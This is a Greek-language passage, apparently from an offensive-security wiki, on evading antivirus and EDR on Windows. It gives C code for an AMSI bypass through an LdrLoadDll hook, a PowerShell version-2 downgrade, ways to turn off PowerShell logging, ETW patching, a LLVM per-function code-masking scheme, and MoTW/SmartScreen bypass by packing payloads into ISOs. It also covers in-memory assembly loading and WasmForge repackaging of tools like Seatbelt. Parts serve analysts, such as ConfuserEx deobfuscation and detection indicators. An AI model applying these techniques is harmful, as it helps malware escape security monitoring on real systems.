Το AMSI αρχικοποιείται μόνο μετά τη φόρτωση του `amsi.dll` στην τρέχουσα διεργασία. Μια ανθεκτική, ανεξάρτητη από τη γλώσσα παράκαμψη είναι η τοποθέτηση ενός hook σε επίπεδο χρήστη στο `ntdll!LdrLoadDll`, το οποίο επιστρέφει σφάλμα όταν η ζητούμενη μονάδα είναι το `amsi.dll`. Ως αποτέλεσμα, το AMSI δεν φορτώνεται ποτέ και δεν πραγματοποιούνται σαρώσεις σε αυτή τη διεργασία.<sup>[[23]](#references)</sup>

Περιγραφή υλοποίησης (ψευδοκώδικας C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Σημειώσεις
- Λειτουργεί εξίσου με PowerShell, WScript/CScript και custom loaders (οτιδήποτε θα φόρτωνε διαφορετικά το AMSI).
- Συνδυάστε το με την τροφοδότηση των scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μεγάλα ίχνη στη γραμμή εντολών.
- Έχει χρησιμοποιηθεί από loaders που εκτελούνται μέσω LOLBins (π.χ. `regsvr32` που καλεί το `DllRegisterServer`).

Το εργαλείο **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για παράκαμψη του AMSI.
Το εργαλείο **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για παράκαμψη του AMSI, το οποίο αποφεύγει την ανίχνευση από signatures χρησιμοποιώντας τυχαιοποιημένες, ορισμένες από τον χρήστη συναρτήσεις, μεταβλητές και εκφράσεις χαρακτήρων, ενώ εφαρμόζει τυχαία κεφαλαιοποίηση σε λέξεις-κλειδιά του PowerShell για να αποφεύγει τα signatures.

**Αφαίρεση του εντοπισμένου signature**

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το εντοπισμένο AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Αυτό το εργαλείο λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για το AMSI signature και έπειτα αντικαθιστώντας το με εντολές NOP, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:

```bash
powershell.exe -version 2
```

## Καταγραφή PowerShell

Η καταγραφή PowerShell είναι μια λειτουργία που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Απενεργοποίηση της Transcription και της καταγραφής Module του PowerShell**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Χρήση της έκδοσης 2 του Powershell**: Αν χρησιμοποιήσετε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Χρήση μιας μη διαχειριζόμενης συνεδρίας PowerShell**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει ελέγχους που συνδέονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Συσκότιση

> [!TIP]
> Αρκετές τεχνικές συσκότισης βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει την εντροπία του binary και διευκολύνει τον εντοπισμό του από AV και EDR. Να είστε προσεκτικοί και, ενδεχομένως, να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή χρειάζεται να αποκρυφτούν.

### Αποσυσκότιση .NET Binaries που προστατεύονται με ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks), είναι συνηθισμένο να συναντήσετε πολλά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω διαδικασία **επαναφέρει ένα IL σχεδόν ίδιο με το αρχικό**, το οποίο στη συνέχεια μπορεί να απομεταγλωττιστεί σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Επίσης, τροποποιεί το checksum του PE, με αποτέλεσμα οποιαδήποτε τροποποίηση να προκαλέσει κατάρρευση του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα κλειδιά XOR και να ξαναγράψετε ένα καθαρό assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Το output περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να φανούν χρήσιμες όταν δημιουργείτε το δικό σας unpacker.

2.  Ανάκτηση συμβόλων / ροής ελέγχου – δώστε το *καθαρό* αρχείο στο **de4dot-cex** (ένα fork του de4dot που υποστηρίζει το ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – επιλέξτε το profile ConfuserEx 2
     • το de4dot θα αναιρέσει το control-flow flattening, θα επαναφέρει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Αφαίρεση proxy calls – το ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με ελαφριά wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει ακόμη περισσότερο το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Μετά από αυτό το βήμα, θα πρέπει να βλέπετε κανονικά .NET API, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητος καθαρισμός – εκτελέστε το binary που προκύπτει στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array, η οποία αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να χρειαστεί να εκτελέσετε το κακόβουλο δείγμα – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη διαλογή δειγμάτων.

#### Μία γραμμή
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/), το οποίο να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς μπορεί να χρησιμοποιηθεί η γλώσσα `C++11/14` για την παραγωγή obfuscated code κατά τη μεταγλώττιση, χωρίς εξωτερικά εργαλεία και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated λειτουργιών, οι οποίες παράγονται από το framework C++ template metaprogramming και δυσκολεύουν λίγο περισσότερο τη ζωή όποιου θέλει να κάνει crack την εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα αρχεία PE, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή μηχανή metamorphic code για αυθαίρετα εκτελέσιμα αρχεία.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα framework λεπτομερούς code obfuscation για γλώσσες που υποστηρίζονται από το LLVM, το οποίο χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα στο επίπεδο του assembly code, μετατρέποντας τις κανονικές εντολές σε ROP chains και ανατρέποντας τη φυσική μας αντίληψη για τη συνηθισμένη ροή ελέγχου.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και κατόπιν να τα φορτώσει

### Αυτομάσκηση ανά συνάρτηση με υποβοήθηση compiler LLVM

Αντί να γίνεται masking σε ολόκληρο το implant μόνο όσο βρίσκεται σε αδράνεια, ένα τροποποιημένο LLVM X86 backend μπορεί να διατηρεί επιλεγμένες συναρτήσεις σε XOR-masked μορφή όποτε είναι ανενεργές. Το PoC Function Peekaboo επιλέγει αποδιαμορφωμένα ονόματα που περιέχουν `REG_`, εισάγει position-independent stubs εισόδου/εξόδου γύρω από τον τελικό machine code και εκπέμπει έναν κοινό masking handler στο `.text`. Οι υπογραφές σε επίπεδο πηγαίου κώδικα και η σύμβαση κλήσεων Windows x64 παραμένουν αμετάβλητες.<sup>[[38]](#references)[[39]](#references)</sup>

#### Μετασχηματισμός ροής ελέγχου στο backend

Αυτό πρέπει να γίνεται μετά την επιλογή εντολών και τη βελτιστοποίηση, επειδή ο μετασχηματισμός πρέπει να καλύπτει **κάθε return που εκπέμπεται** και να γνωρίζει την ακριβή διάταξη x86. Ένα `MachineFunctionPass` πριν από την εκπομπή εντοπίζει το τελευταίο `MachineInstr::isReturn()`, το διαγράφει ώστε η τελική διαδρομή να συνεχίζει στο προσαρτημένο επίλογο και αντικαθιστά τα προηγούμενα returns με `JMP_1 handler`. Διατηρήστε τυχόν teardown στοίβας/frame που έχει παραγάγει ο compiler πριν από κάθε return· ανακατευθύνετε μόνο την ίδια την εντολή return.<sup>[[38]](#references)[[39]](#references)</sup>

Οι `X86AsmPrinter::emitFunctionBodyStart()` και `X86AsmPrinter::emitFunctionBodyEnd()` εκπέμπουν τα stubs ανά συνάρτηση, ενώ η `emitEndOfAsmFile()` εκπέμπει τον handler. Τα σύμβολα που μοιράζονται μεταξύ των σταδίων εκπομπής επιτρέπουν σε ένα branch του prologue να στοχεύει τον μεταγενέστερο επίλογό του. Για χειροκίνητα εκπεμπόμενο near `je`, γράψτε `0F 84` ακολουθούμενο από την τετρα-byte MC έκφραση `target - address_after_je`. Οι κλήσεις και τα jumps προς τον handler μπορούν, εναλλακτικά, να εκπέμπονται ως αντικείμενα `MCInst` (`CALL64pcrel32` και `JMP_1`). Ένα pass πρέπει να επιστρέφει `false` για μια μη επιλεγμένη συνάρτηση, όταν δεν έχει αλλάξει τίποτα· το PoC επιστρέφει λανθασμένα `true` σε αυτήν την περίπτωση.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata και αρχικοποίηση πριν από το CRT

Το PoC τοποθετεί ένα XOR key και εγγραφές 16 byte, οι οποίες περιέχουν έναν δείκτη συνάρτησης που έχει υποστεί relocation από τον loader και ένα runtime μήκος, στο `.funcmeta`. Παρότι το πεδίο C είναι `uint32_t`, ο handler προσπελαύνει ένα QWORD στο offset `+8` της εγγραφής, καταναλώνοντας το μήκος και το padding του, και προχωρά στις εγγραφές κατά `0x10`. Τα ονόματα των PE section έχουν μήκος μόνο οκτώ byte, επομένως η αναζήτηση κατά το runtime εντοπίζει το `.funcmet`. Ένα εξωτερικό patcher προσθέτει ένα εκτελέσιμο `.stub`, αποθηκεύει το παλιό entry-point RVA στο stub και ανακατευθύνει το `AddressOfEntryPoint`. Το PIC stub λαμβάνει τη βάση του image από το `gs:[0x60]` → `[PEB+0x10]`, διασχίζει τα PE32+ imports για να επιλύσει ένα ήδη εισαγμένο `VirtualProtect` και εκτελείται πριν από το CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Η αρχικοποίηση ορίζει ένα sentinel στο `gs:[0xE8]` και καλεί κάθε συνάρτηση metadata. Το prologue, το οποίο παραμένει μόνιμα αναγνώσιμο, καταγράφει την αρχή της συνάρτησης στο `gs:[0xF0]`, εντοπίζει το sentinel και παραλείπει το σώμα που δεν έχει ακόμη γίνει mask. Στη συνέχεια, ο επίλογος χρησιμοποιεί `call handler`. Αφού ο handler αποθηκεύσει 13 registers (`0x68` byte), η διεύθυνση επιστροφής στο `[rsp+0x68]` είναι το τέλος της μετασχηματισμένης συνάρτησης, οπότε το `end - start` μπορεί να γραφτεί στην εγγραφή metadata. Το stub απαλείφει το sentinel και μεταβαίνει στο `ImageBase + original_entry_point_RVA` αφού γίνουν mask όλα τα σώματα.<sup>[[38]](#references)[[39]](#references)</sup>

Κατά τη διάρκεια μιας κανονικής κλήσης, το prologue καλεί τον ίδιο συμμετρικό handler για να αποκωδικοποιήσει το σώμα. Η τελική διαδρομή συνεχίζει στον προσαρτημένο επίλογο, ενώ κάθε προηγούμενο return μεταβαίνει απευθείας στον κοινό handler. Ο κανονικός επίλογος χρησιμοποιεί επίσης `jmp handler` αντί για `call`, οπότε, μετά το re-masking, το `ret` του handler καταναλώνει τη διεύθυνση επιστροφής του αρχικού caller και διατηρεί το αποτέλεσμα της συνάρτησης στο `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Πρωτόγονος μηχανισμός masking και ενδείξεις ανάλυσης

Ο handler εντοπίζει την τρέχουσα εγγραφή, παραλείπει το σταθερό ορατό prologue (`0x46` byte σε αυτό το build), αλλάζει την υπόλοιπη περιοχή σε `PAGE_EXECUTE_READWRITE`, εφαρμόζει XOR byte προς byte με το χαμηλό byte του key και στη συνέχεια την ορίζει σε `PAGE_EXECUTE_READ`. Επομένως, ο ίδιος βρόχος αποκωδικοποιεί κατά την είσοδο και κωδικοποιεί κατά κάθε κανονική έξοδο.<sup>[[38]](#references)[[39]](#references)</sup>

Ισχυρές ενδείξεις για αυτόν τον σχεδιασμό περιλαμβάνουν:<sup>[[38]](#references)[[39]](#references)</sup>

- ένα entry point μέσα σε εκτελέσιμο `.stub` και ένα section `.funcmet` που περιέχει ένα key μαζί με relocated δείκτες προς το `.text`·
- parsing των PEB, import table και section table πριν από το CRT, και στη συνέχεια κλήσεις μέσω κάθε δείκτη metadata·
- πανομοιότυπα PIC prologues `call`/`pop` και πολλά σημεία επιστροφής που ανακατευθύνονται σε έναν handler·
- εγγραφές στα `gs:[0xE8]`, `gs:[0xF0]` και `gs:[0xF8]`, ακολουθούμενες από επαναλαμβανόμενες μεταβάσεις `VirtualProtect` και εγγραφές XOR byte προς byte σε εκτελέσιμες σελίδες που υποστηρίζονται από το image.

Πρόκειται για αποφυγή memory scanner, όχι για κρυπτογραφική προστασία: το patched αρχείο εξακολουθεί να περιέχει το αρχικό σώμα σε clear μορφή, ενώ ένας debugger μπορεί να σταματήσει στο `VirtualProtect` ή στον βρόχο XOR και να κάνει dump την ενεργή συνάρτηση. Το XOR ενός byte, το αναγνώσιμο metadata και το σταθερό όριο `0x46` καθιστούν επίσης εύκολη την offline ανάκτηση.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Τα TEB slots του PoC είναι τοπικά ανά thread, αλλά οι τροποποιημένες σελίδες κώδικα είναι κοινές σε όλη τη διεργασία. Επομένως, ταυτόχρονη ή αναδρομική είσοδος μπορεί να εναλλάσσει ξανά τις εντολές ενώ εκτελείται άλλη κλήση· εξαιρέσεις και μη τοπικές έξοδοι μπορούν επίσης να παρακάμψουν το re-masking. Μια στιβαρή υλοποίηση πρέπει να συγχρονίζει τις μεταβάσεις, να επαναφέρει την προστασία που επιστρέφεται πράγματι μέσω του `lpflOldProtect`, να αποφεύγει hard-coded μήκη stub, να ελέγχει τις διαδρομές `call` και `jmp` για την ευθυγράμμιση της στοίβας x64 και να καλεί `FlushInstructionCache` μετά την επανεγγραφή εκτελέσιμων byte. Η Microsoft καθιστά ρητά τον caller υπεύθυνο για τη συνοχή της instruction cache όταν τροποποιείται εκτελέσιμος κώδικας.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Ίσως έχετε δει αυτήν την οθόνη όταν κατεβάζετε ορισμένα εκτελέσιμα από το internet και τα εκτελείτε.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen βασίζεται κυρίως στη φήμη: εφαρμογές που δεν κατεβαίνουν συχνά ενεργοποιούν το SmartScreen, το οποίο ειδοποιεί τον τελικό χρήστη και αποτρέπει την εκτέλεση του αρχείου (αν και το αρχείο μπορεί και πάλι να εκτελεστεί κάνοντας κλικ στις επιλογές Περισσότερες πληροφορίες -> Εκτέλεση ούτως ή άλλως).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη αρχείων από το internet, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Έλεγχος του Zone.Identifier ADS για ένα αρχείο που κατέβηκε από το internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι τα εκτελέσιμα που υπογράφονται με **έμπιστο** πιστοποιητικό υπογραφής **δεν ενεργοποιούν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να εμποδίσετε τα payloads σας να λάβουν το Mark of The Web είναι να τα συσκευάσετε σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε τόμους **που δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα εργαλείο που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ακολουθεί demo για την παράκαμψη του SmartScreen με συσκευασία payloads μέσα σε αρχεία ISO μέσω του [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός καταγραφής στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα στοιχεία του συστήματος να **καταγράφουν συμβάντα**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από προϊόντα ασφαλείας για την παρακολούθηση και τον εντοπισμό κακόβουλων δραστηριοτήτων.

Όπως το AMSI μπορεί να απενεργοποιηθεί (να παρακαμφθεί), είναι επίσης δυνατό να ρυθμιστεί η συνάρτηση **`EtwEventWrite`** μιας διεργασίας user space ώστε να επιστρέφει αμέσως, χωρίς να καταγράφει συμβάντα. Αυτό γίνεται με την τροποποίηση της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά την καταγραφή ETW για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflection assemblies C#

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να είναι ένας πολύ καλός τρόπος για να εκτελείτε τα post-exploitation εργαλεία σας χωρίς να εντοπιστείτε από το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη, χωρίς να αγγίξει τον δίσκο, θα πρέπει να μας απασχολήσει μόνο η επιδιόρθωση του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει **τη δημιουργία μιας νέας sacrificial διεργασίας**, την εισαγωγή του κακόβουλου post-exploitation κώδικά σας σε αυτήν τη νέα διεργασία, την εκτέλεση του κακόβουλου κώδικα και, όταν ολοκληρωθεί, τον τερματισμό της νέας διεργασίας. Αυτή η μέθοδος έχει πλεονεκτήματα και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση γίνεται **εκτός** της διεργασίας του Beacon implant. Αυτό σημαίνει ότι, αν κάτι πάει στραβά κατά την ενέργεια post-exploitation ή εντοπιστεί, υπάρχουν **πολύ περισσότερες πιθανότητες** να **επιβιώσει το implant**. Το μειονέκτημα είναι ότι υπάρχουν **περισσότερες πιθανότητες** να εντοπιστείτε από **συμπεριφορικές ανιχνεύσεις**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την εισαγωγή του κακόβουλου post-exploitation κώδικα **στη δική του διεργασία**. Έτσι, μπορείτε να αποφύγετε τη δημιουργία νέας διεργασίας και τη σάρωσή της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχουν **πολύ περισσότερες πιθανότητες** να **χάσετε το beacon** επειδή μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για τη φόρτωση C# Assembly, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [βίντεο του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Ανασυσκευασία εργαλείων .NET σε WebAssembly με NativeAOT (WasmForge)

Οι συνηθισμένες τεχνικές `execute-assembly` διατηρούν αναγνωρίσιμο MSIL και τελικά αρχικοποιούν ένα CLR. Το **WasmForge** αλλάζει το υπόστρωμα εκτέλεσης: μεταφέρει ένα C# project στον πειραματικό στόχο NativeAOT-LLVM WASI, το μεταγλωττίζει εκ των προτέρων σε WebAssembly και ενσωματώνει αυτό το module σε έναν Windows PE host που βασίζεται στο Wazero. Η διεργασία που προκύπτει δεν χρειάζεται το CLR, το JIT ή το `dotnet` host του στόχου, επομένως οι κανόνες που βασίζονται αποκλειστικά σε ονόματα managed assemblies, στη φόρτωση CLR, στο AMSI ή στο .NET ETW χάνουν την άμεση ορατότητα. Πρόκειται για τεχνική αποφυγής εντοπισμού/συσκευασίας και όχι για παράκαμψη ορίων προνομίων — το guest διατηρεί τα αρχικά δικαιώματα και την παρατηρήσιμη συμπεριφορά του εργαλείου στο λειτουργικό σύστημα.<sup>[[44]](#references)[[45]](#references)</sup>

### Δημιουργία C# project

Η προτεινόμενη διαδικασία build χρησιμοποιεί το Docker περιβάλλον του project, καθώς περιλαμβάνει το .NET 10 SDK, το NativeAOT-LLVM workload, το WASI SDK 24.0, τον linker και τις εξαρτήσεις υπογραφής. Ένα `.csproj` εντοπίζεται αυτόματα· η διαδικασία build με μία εντολή εκτελεί τη μεταφορά, την επιδιόρθωση συμβατότητας, τη μεταγλώττιση σε WASM, τη δημιουργία PE και την υπογραφή.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για troubleshooting ή έλεγχο του παραγόμενου κώδικα, χωρίστε τη διαδικασία στα βήματα `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Το build image χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld` για να αποφύγει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το ενσωματωμένο runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γεφύρωση wasm32 C# με x64 Win32

Αυτό δεν είναι διαφανής επαναμεταγλώττιση. Το NativeAOT-WASI δεν διαθέτει ορισμένα Windows-oriented χαρακτηριστικά του BCL ή τα υλοποιεί διαφορετικά, ενώ ένας wasm32 guest συνήθως δεσμεύει slots δεικτών τεσσάρων byte, παρότι τα x64 API μπορούν να επιστρέψουν δείκτες οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα ακόλουθα παραγόμενα επίπεδα:<sup>[[44]](#references)</sup>

1. Ένας source patcher διορθώνει σημασιολογικές διαφορές ειδικές για το AOT και ανακατευθύνει μη υποστηριζόμενες κλήσεις registry, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες κλήσεις σε βοηθητικές συναρτήσεις `Wf*`.
2. Ένας P/Invoke scanner παράγει αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με linked σύμβολα C bridge αντί να φορτώνουν δυναμικά το δηλωμένο DLL μέσα στον guest.
